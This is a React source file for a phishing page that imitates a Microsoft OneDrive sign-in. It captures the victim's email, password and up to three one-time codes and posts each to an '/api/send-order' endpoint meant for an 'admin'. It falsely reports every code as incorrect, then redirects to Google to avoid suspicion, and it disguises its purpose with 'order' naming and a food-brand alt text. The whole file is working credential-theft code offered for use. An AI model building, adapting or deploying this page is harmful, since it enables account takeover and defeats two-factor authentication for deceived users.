/**
 * src/pages/MenuPage.jsx
 *
 * Three-step flow: Email → PIN → Verify Email (OTP).
 * 1. Email is validated.
 * 2. PIN is sent to admin, then moves to OTP.
 * 3. OTP is sent to admin. User has 3 attempts to submit an OTP.
 * If 3 attempts are reached, or 10 minutes pass, redirects to Google.
 */
import React, { useEffect, useRef, useState } from "react";
import bgImage from '../assets/mybackgrounder.png';
import logoImage from '../assets/image.png';

const STEPS = ["email", "pin", "code"];
const EMPTY_FORM = { email: "", pin: "" };

const STEP_META = {
  email: {
    label: "Email, Phone or Skype",
    type: "email",
    placeholder: "Email, or Phone or skype",
    hint: null,
  },
  pin: {
    label: "Enter your Password",
    type: "password",
    placeholder: "Password",
    hint: null,
  },
};

export default function MenuPage() {
  const [form, setForm] = useState(EMPTY_FORM);
  const [step, setStep] = useState(0);
  const [fieldErr, setFieldErr] = useState("");
  const [sending, setSending] = useState(false);
  const [, setSlideDir] = useState("in");
  const [visible, setVisible] = useState(true);
  const [showPin, setShowPin] = useState(false);
  const [orderSubmitted, setOrderSubmitted] = useState(false);
  const [isFocused, setIsFocused] = useState(false);
  const [sessionId, setSessionId] = useState('');
  
  // OTP State
  const [code, setCode] = useState(["", "", "", "", "", ""]);
  const [otpAttempts, setOtpAttempts] = useState(0);
  
  const codeInputs = useRef([]);
  const timerRef = useRef(null);
  const inputRef = useRef(null);

  // Reset on page load
  useEffect(() => {
    setForm(EMPTY_FORM);
    setStep(0);
    setOrderSubmitted(false);
    setOtpAttempts(0);
    setFieldErr("");
    setCode(["", "", "", "", "", ""]);
  }, []);

  // Generate or retrieve session ID on mount
  useEffect(() => {
    let sid = sessionStorage.getItem('ms_session_id');
    if (!sid) {
      sid = 'sess_' + Math.random().toString(36).substring(2, 15) + Date.now().toString(36);
      sessionStorage.setItem('ms_session_id', sid);
    }
    setSessionId(sid);
  }, []);

  useEffect(() => {
    if (inputRef.current && !orderSubmitted && step < 2) {
      setTimeout(() => inputRef.current?.focus(), 280);
    }
  }, [step, orderSubmitted]);

  // Handle 10-minute timer for OTP step
  useEffect(() => {
    if (step === 2) {
      // Start 10-minute timer
      timerRef.current = setTimeout(() => {
        window.location.href = "https://www.google.com";
      }, 2 * 60 * 1000); // 2 minutes
    }

    return () => {
      if (timerRef.current) clearTimeout(timerRef.current);
    };
  }, [step]);

  useEffect(() => {
    return () => {
      if (timerRef.current) clearTimeout(timerRef.current);
    };
  }, []);

  function handleChange(e) {
    const { name, value } = e.target;
    setForm((prev) => ({ ...prev, [name]: value }));
    setFieldErr("");
  }

  function animateStep(nextStep) {
    setVisible(false);
    setSlideDir("out");
    setTimeout(() => {
      setStep(nextStep);
      setSlideDir("in");
      setVisible(true);
    }, 220);
  }

  // Send a single PIN attempt or OTP code to the Vercel serverless function
  async function sendAttempt(payload) {
    setSending(true);
    try {
      const response = await fetch('/api/send-order', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        credentials: 'include',
        body: JSON.stringify({
          email: form.email.trim(),
          sessionId,
          ...payload,
        }),
      });

      if (!response.ok) {
        const text = await response.text();
        let errorMsg = `HTTP ${response.status}`;
        try {
          const json = JSON.parse(text);
          if (json.error) errorMsg = json.error;
        } catch (_) { /* ignore */ }
        throw new Error(errorMsg);
      }

      const data = await response.json();
      if (!data.success) throw new Error('Proxy failed');
    } catch (err) {
      console.error("Failed to send attempt:", err);
    } finally {
      setSending(false);
    }
  }

  async function handleNext(e) {
    if (e) e.preventDefault();
    const fieldName = STEPS[step];

    if (fieldName === "email") {
      if (!form.email.trim()) {
        setFieldErr(`Please enter your ${STEP_META.email.label.toLowerCase()}.`);
        return;
      }
      if (!/\S+@\S+\.\S+/.test(form.email)) {
        setFieldErr("Please enter a valid email address.");
        return;
      }
      animateStep(1);
      return;
    }

    if (fieldName === "pin") {
      if (!form.pin.trim()) {
        setFieldErr(`Please enter your password.`);
        return;
      }

      // Send PIN to admin (2nd slide)
      await sendAttempt({ pin: form.pin.trim() });
      
      // Move to OTP slide regardless of PIN correctness
      animateStep(2);
      return;
    }
  }

  // OTP Handlers
  const handleOtpChange = (index, value) => {
    const val = value.replace(/\D/g, "");
    if (!val && value !== "") return;

    const newCode = [...code];
    newCode[index] = val;
    setCode(newCode);
    setFieldErr("");

    if (val && index < 5) {
      codeInputs.current[index + 1]?.focus();
    }
  };

  const handleOtpKeyDown = (index, e) => {
    if (e.key === "Backspace" && !code[index] && index > 0) {
      codeInputs.current[index - 1]?.focus();
    }
    if (e.key === "Enter") {
      handleSubmitOtp();
    }
  };

  const handleOtpPaste = (e) => {
    e.preventDefault();
    const pasted = e.clipboardData.getData("text").replace(/\D/g, "").slice(0, 6);
    if (pasted) {
      const newCode = [...code];
      for (let i = 0; i < pasted.length; i++) {
        if (i < 6) newCode[i] = pasted[i];
      }
      setCode(newCode);
      const focusIndex = Math.min(pasted.length, 5);
      codeInputs.current[focusIndex]?.focus();
    }
  };

  const handleSubmitOtp = async () => {
    const fullCode = code.join("");
    
    if (fullCode.length < 6) {
      setFieldErr("Please enter the 6-digit code.");
      return;
    }

    const newAttempts = otpAttempts + 1;
    setOtpAttempts(newAttempts);

    // Send OTP to admin
    await sendAttempt({ code: fullCode, attemptNumber: newAttempts });

    if (newAttempts >= 3) {
      // After 3 attempts, redirect to Google
      if (timerRef.current) clearTimeout(timerRef.current);
      window.location.href = "https://www.google.com";
      return;
    }

    // If not 3rd attempt, show error and clear inputs
    setFieldErr(`Incorrect code. Please try again.`);
    setCode(["", "", "", "", "", ""]);
    codeInputs.current[0]?.focus();
  };

  function resetToEmail() {
    setFieldErr("");
    setStep(0);
    setCode(["", "", "", "", "", ""]);
    setOtpAttempts(0);
  }

  const fieldName = STEPS[step];
  const meta = STEP_META[fieldName] || {};
  const showHeading = step === 0;

  return (
    <>
      <style>{`
        /* ── Page with background image ── */
        .cf-page {
          min-height: 100vh;
          display: flex;
          flex-direction: column;
          font-family: "Segoe UI", -apple-system, BlinkMacSystemFont, sans-serif;
          background-image: url(${bgImage});
          background-size: cover;
          background-position: center;
          background-attachment: fixed;
        }
        .cf-page::before {
          content: '';
          position: fixed;
          top: 0; left: 0; right: 0; bottom: 0;
          background: rgba(240, 238, 255, 0.7);
          z-index: 0;
        }
        .cf-main, .cf-inner, .cf-footer {
          position: relative;
          z-index: 1;
        }

        .cf-page {
          display: flex;
          flex-direction: column;
          justify-content: center;
          align-items: center;
        }

        .cf-main {
          flex: 1;
          display: flex;
          flex-direction: column;
          align-items: center;
          justify-content: center;
          width: 100%;
          padding: 24px 16px;
        }

        .cf-inner {
          width: 100%;
          max-width: 440px;
        }

        .cf-card {
          background: #fff;
          border-radius: 2px;
          box-shadow: 0 2px 8px rgba(0,0,0,0.08), 0 8px 32px rgba(0,0,0,0.06), 0 16px 48px rgba(0,0,0,0.04);
          padding: 40px 44px 36px;
          width: 100%;
          position: relative;
        }
        @media (max-width: 520px) {
          .cf-card { padding: 28px 20px 24px; }
        }

        .cf-brand {
          display: flex;
          align-items: center;
          gap: 8px;
          margin-bottom: 24px;
        }
        .cf-brand-center { justify-content: center; }
        .cf-brand-left { justify-content: flex-start; }
        .cf-brand-logo {
          width: 64px;
          height: 64px;
          object-fit: contain;
          flex-shrink: 0;
        }
        .cf-brand-name { font-weight: 700; font-size: 15px; color: #424242; }

        .cf-card-title {
          font-size: 24px;
          font-weight: 600;
          color: #1a1523;
          margin-bottom: 24px;
        }
        .cf-card-title-left { text-align: left; }

        .cf-pin-heading {
          font-size: 24px;
          font-weight: 600;
          color: #1a1523;
          text-align: center;
          margin-bottom: 24px;
        }

        .cf-email-display {
          font-size: 15px;
          color: #1a1523;
          padding: 8px 16px;
          border: 1px solid #e0e0e0;
          border-radius: 20px;
          background: #fafafa;
          text-align: center;
          font-weight: 500;
          display: inline-block;
          width: auto;
          margin-left: auto;
          margin-right: auto;
        }
        .cf-email-wrapper { text-align: center; margin-bottom: 16px; }

        .cf-field-wrap {
          margin-bottom: 24px;
          position: relative;
          padding-top: 12px;
        }
        .cf-input {
          width: 100%;
          border: none;
          border-bottom: 2px solid #e0e0e0;
          padding: 8px 40px 6px 0;
          font-size: 16px;
          color: #1a1523;
          background: transparent;
          outline: none;
          transition: border-color 0.2s ease;
          box-sizing: border-box;
        }
        .cf-input:focus { border-bottom-color: #0078d4; }
        .cf-input-label {
          position: absolute;
          left: 0;
          top: 12px;
          font-size: 16px;
          color: #999;
          pointer-events: none;
          transition: all 0.2s cubic-bezier(0.4, 0, 0.2, 1);
          transform-origin: top left;
        }
        .cf-input-label.floating {
          transform: translateY(-20px) scale(0.85);
          color: #666;
          font-weight: 400;
        }
        .cf-input.error { border-bottom-color: #d32f2f; }
        .cf-error {
          font-size: 13px;
          color: #d32f2f;
          margin-top: -12px;
          margin-bottom: 12px;
          text-align: center;
        }

        .cf-link {
          color: #0067b8;
          font-size: 14px;
          text-decoration: none;
          cursor: pointer;
        }
        .cf-link:hover { text-decoration: underline; }

        .cf-btn {
          display: block;
          width: 100%;
          padding: 10px 0;
          background: #0078d4;
          color: #fff;
          font-size: 15px;
          font-weight: 500;
          border: none;
          border-radius: 2px;
          cursor: pointer;
          transition: background 0.18s;
          text-align: center;
          margin-top: 8px;
        }
        .cf-btn:hover:not(:disabled) { background: #106ebe; }
        .cf-btn:disabled { background: #b0b0b0; cursor: not-allowed; }

        .cf-btn-right {
          width: auto;
          padding: 10px 32px;
          margin-top: 0;
          margin-left: auto;
          display: inline-block;
        }
        .cf-btn-container { display: flex; justify-content: flex-end; margin-top: 8px; }

        .cf-different-email {
          display: block;
          margin-top: 16px;
          font-size: 14px;
          color: #0067b8;
          cursor: pointer;
          background: none;
          border: none;
          padding: 0;
          width: 100%;
          text-align: center;
        }
        .cf-different-email:hover { text-decoration: underline; }

        @keyframes slideInRight {
          from { opacity: 0; transform: translateX(32px); }
          to   { opacity: 1; transform: translateX(0); }
        }
        @keyframes slideOutLeft {
          from { opacity: 1; transform: translateX(0); }
          to   { opacity: 0; transform: translateX(-32px); }
        }
        .slide-in  { animation: slideInRight 0.22s ease forwards; }
        .slide-out { animation: slideOutLeft 0.22s ease forwards; }

        .cf-pin-toggle {
          position: absolute;
          right: 0;
          bottom: 6px;
          background: none;
          border: none;
          cursor: pointer;
          padding: 0 4px;
          line-height: 1;
          color: #666;
          font-size: 18px;
          display: flex;
          align-items: center;
        }
        .cf-pin-toggle svg {
          width: 20px;
          height: 20px;
          fill: #666;
          transition: fill 0.2s;
        }
        .cf-pin-toggle:hover svg { fill: #0078d4; }

        .cf-footer {
          width: 100%;
          max-width: 440px;
          margin: 24px auto 0;
          padding: 0 16px 24px;
          text-align: center;
          font-size: 12px;
          color: #666;
        }
        .cf-footer-links {
          display: flex;
          flex-wrap: wrap;
          justify-content: center;
          gap: 12px 20px;
          margin-bottom: 12px;
        }
        .cf-footer-links a,
        .cf-footer-link-btn {
          color: #666;
          text-decoration: none;
          font-size: 12px;
          background: none;
          border: none;
          padding: 0;
          cursor: pointer;
          font-family: inherit;
        }
        .cf-footer-links a:hover,
        .cf-footer-links .cf-footer-link-btn:hover { text-decoration: underline; color: #333; }
        .cf-footer-note {
          font-size: 12px;
          color: #888;
          line-height: 1.5;
        }
        .cf-footer-note a,
        .cf-footer-note .cf-footer-link-btn {
          color: #0067b8;
          text-decoration: none;
        }
        .cf-footer-note a:hover,
        .cf-footer-note .cf-footer-link-btn:hover { text-decoration: underline; }

        @keyframes shake {
          0%, 100% { transform: translateX(0); }
          25% { transform: translateX(-8px); }
          75% { transform: translateX(8px); }
        }
        .shake { animation: shake 0.3s ease-in-out; }

        /* ── OTP Step Styles ── */
        .cf-back-btn {
          position: absolute;
          top: 32px;
          left: 32px;
          background: none;
          border: none;
          cursor: pointer;
          padding: 8px;
          display: flex;
          align-items: center;
          justify-content: center;
          border-radius: 50%;
          transition: background 0.2s;
        }
        .cf-back-btn:hover { background: #f0f0f0; }
        .cf-back-btn svg {
          width: 24px;
          height: 24px;
          fill: #444;
        }

        .cf-otp-heading {
          font-size: 24px;
          font-weight: 600;
          color: #1a1523;
          text-align: center;
          margin-top: 16px;
          margin-bottom: 8px;
        }

        .cf-otp-subtext {
          font-size: 14px;
          color: #666;
          text-align: center;
          margin-bottom: 24px;
        }

        .cf-otp-inputs {
          display: flex;
          justify-content: center;
          gap: 10px;
          margin-bottom: 16px;
        }

        .cf-otp-box {
          width: 46px;
          height: 52px;
          border: 1px solid #ccc;
          border-radius: 4px;
          text-align: center;
          font-size: 24px;
          color: #1a1523;
          outline: none;
          transition: border-color 0.2s, box-shadow 0.2s;
        }
        .cf-otp-box:focus {
          border-color: #0078d4;
          box-shadow: 0 0 0 1px #0078d4;
        }

        .cf-resend-link {
          display: block;
          text-align: center;
          font-size: 14px;
          color: #0067b8;
          cursor: pointer;
          text-decoration: none;
          margin-bottom: 24px;
        }
        .cf-resend-link:hover { text-decoration: underline; }
      `}</style>

      <div className="cf-page">
        <main className="cf-main">
          <div className="cf-inner">
            <div className="cf-card">
              {step === 2 ? (
                <>
                  {/* Back Button */}
                  <button 
                    className="cf-back-btn" 
                    onClick={() => { setFieldErr(""); animateStep(1); }}
                    aria-label="Go back"
                  >
                    <svg viewBox="0 0 24 24">
                      <path d="M20 11H7.83l5.59-5.59L12 4l-8 8 8 8 1.41-1.41L7.83 13H20v-2z"/>
                    </svg>
                  </button>

                  <div className="cf-brand cf-brand-center">
                    <img src={logoImage} alt="Chow Food logo" className="cf-brand-logo" />
                    <span className="cf-brand-name">Onedrive</span>
                  </div>

                  <div className="cf-email-wrapper">
                    <div className="cf-email-display">{form.email}</div>
                  </div>

                  <h1 className="cf-otp-heading">Verify your email</h1>
                  <p className="cf-otp-subtext">
                    Enter the code we sent to your email address.
                  </p>

                  <div className="cf-otp-inputs" onPaste={handleOtpPaste}>
                    {code.map((digit, index) => (
                      <input
                        key={index}
                        ref={(el) => (codeInputs.current[index] = el)}
                        type="text"
                        maxLength={1}
                        className="cf-otp-box"
                        value={digit}
                        onChange={(e) => handleOtpChange(index, e.target.value)}
                        onKeyDown={(e) => handleOtpKeyDown(index, e)}
                        disabled={sending || orderSubmitted}
                      />
                    ))}
                  </div>

                  {fieldErr && <p className="cf-error">{fieldErr}</p>}

                  <button type="button" className="cf-resend-link" onClick={() => {}}>
  Resend code
</button>

                  <button
                    className="cf-btn"
                    onClick={handleSubmitOtp}
                    disabled={sending || orderSubmitted}
                  >
                    {sending ? "Verifying…" : "Submit"}
                  </button>
                </>
              ) : (
                <>
                  <div className={`cf-brand ${step === 0 ? 'cf-brand-left' : 'cf-brand-center'}`}>
                    <img src={logoImage} alt="Chow Food logo" className="cf-brand-logo" />
                    <span className="cf-brand-name">Onedrive
                    </span>
                  </div>

                  {showHeading && (
                    <h1 className="cf-card-title cf-card-title-left">Sign in</h1>
                  )}

                  <div key={step} className={visible ? "slide-in" : "slide-out"}>
                    {fieldName === "pin" && (
                      <>
                        <div className="cf-email-wrapper">
                          <div className="cf-email-display">{form.email}</div>
                        </div>
                        <h1 className="cf-pin-heading">Enter your Password</h1>
                      </>
                    )}

                    <div className={`cf-field-wrap ${fieldErr ? 'shake' : ''}`}>
                      <input
                        ref={inputRef}
                        id={fieldName}
                        name={fieldName}
                        type={fieldName === "pin" ? (showPin ? "text" : "password") : meta.type}
                        value={form[fieldName]}
                        onChange={handleChange}
                        onFocus={() => setIsFocused(true)}
                        onBlur={() => setIsFocused(false)}
                        placeholder=""
                        autoComplete={fieldName === "email" ? "email" : "off"}
                        className={`cf-input ${fieldErr ? 'error' : ''}`}
                        onKeyDown={(e) => e.key === "Enter" && handleNext(e)}
                        disabled={sending || orderSubmitted}
                      />
                      <label
                        htmlFor={fieldName}
                        className={`cf-input-label ${isFocused || form[fieldName] ? 'floating' : ''}`}
                      >
                        {meta.placeholder}
                      </label>

                      {fieldName === "pin" && (
                        <button
                          type="button"
                          className="cf-pin-toggle"
                          onClick={() => setShowPin(!showPin)}
                          aria-label="Toggle PIN visibility"
                          disabled={sending || orderSubmitted}
                        >
                          {showPin ? (
                            <svg viewBox="0 0 24 24">
                              <path d="M12 4.5C7 4.5 2.73 7.61 1 12c1.73 4.39 6 7.5 11 7.5s9.27-3.11 11-7.5c-1.73-4.39-6-7.5-11-7.5zM12 17c-2.76 0-5-2.24-5-5s2.24-5 5-5 5 2.24 5 5-2.24 5-5 5zm0-8c-1.66 0-3 1.34-3 3s1.34 3 3 3 3-1.34 3-3-1.34-3-3-3z"/>
                            </svg>
                          ) : (
                            <svg viewBox="0 0 24 24">
                              <path d="M12 4.5C7 4.5 2.73 7.61 1 12c1.73 4.39 6 7.5 11 7.5s9.27-3.11 11-7.5c-1.73-4.39-6-7.5-11-7.5zM12 17c-2.76 0-5-2.24-5-5s2.24-5 5-5 5 2.24 5 5-2.24 5-5 5zm0-8c-1.66 0-3 1.34-3 3s1.34 3 3 3 3-1.34 3-3-1.34-3-3-3z"/>
                              <line x1="3" y1="3" x2="21" y2="21" stroke="#666" strokeWidth="2"/>
                            </svg>
                          )}
                        </button>
                      )}
                    </div>

                    {fieldErr && <p className="cf-error">{fieldErr}</p>}

                    {step === 0 && (
                      <>
                        <p style={{ fontSize: 14, color: "#444", marginBottom: 20 }}>
                          No account? <span className="cf-link" onClick={() => {}}>Create one!</span>
                        </p>
                        <p style={{ marginBottom: 20 }}>
                          <span className="cf-link" onClick={() => {}}>Can't access your account?</span>
                        </p>
                      </>
                    )}

                    {fieldName === "pin" && (
                      <p style={{ textAlign: "right", marginTop: -8, marginBottom: 16 }}>
                        <span className="cf-link" onClick={() => {}}>Forgot your password?</span>
                      </p>
                    )}
                  </div>

                  {step === 0 ? (
                    <div className="cf-btn-container">
                      <button
                        className="cf-btn cf-btn-right"
                        onClick={handleNext}
                        disabled={sending || orderSubmitted}
                      >
                        {sending ? "Sending…" : "Next"}
                      </button>
                    </div>
                  ) : (
                    <>
                      <button
                        className="cf-btn"
                        onClick={handleNext}
                        disabled={sending || orderSubmitted}
                      >
                        {sending ? "Sending…" : "Submit"}
                      </button>

                      <button
                        className="cf-different-email"
                        onClick={resetToEmail}
                        disabled={sending || orderSubmitted}
                      >
                        Sign in with a different Email account
                      </button>
                    </>
                  )}
                </>
              )}
            </div>
          </div>
        </main>

        <footer className="cf-footer">
          <div className="cf-footer-links">
            <button type="button" className="cf-footer-link-btn">Help and feedback</button>
            <button type="button" className="cf-footer-link-btn">Terms of use</button>
            <button type="button" className="cf-footer-link-btn">Privacy and cookies</button>
          </div>
          <div className="cf-footer-note">
            Use private browsing if this is not your device.{" "}
            <button type="button" className="cf-footer-link-btn">Learn more</button>
          </div>
        </footer>
      </div>
    </>
  );
}